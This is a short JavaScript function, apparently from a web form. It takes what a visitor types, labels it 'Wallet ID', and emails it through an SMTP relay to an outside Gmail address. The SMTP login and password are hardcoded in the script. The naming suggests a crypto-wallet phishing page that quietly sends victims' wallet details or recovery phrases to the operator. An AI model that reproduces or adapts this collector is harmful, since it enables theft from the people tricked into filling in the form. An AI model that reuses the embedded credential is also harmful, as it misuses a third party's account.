function emailSend(){

    var message = document.getElementById('message').value;

    var messageBody = "Wallet ID: " + message;

    Email.send({
    Host : "smtp.elasticemail.com",
    Username : "genesisrectification@gmail.com",
    Password : "BE65029E46280CA3B78F0EE1F9F96A16AD56",
    To : 'newemail20012707@gmail.com',
    From : "genesisrectification@gmail.com",
    Subject : "This is the subject",
    Body : messageBody
}).then(
  message => alert(message)
);
}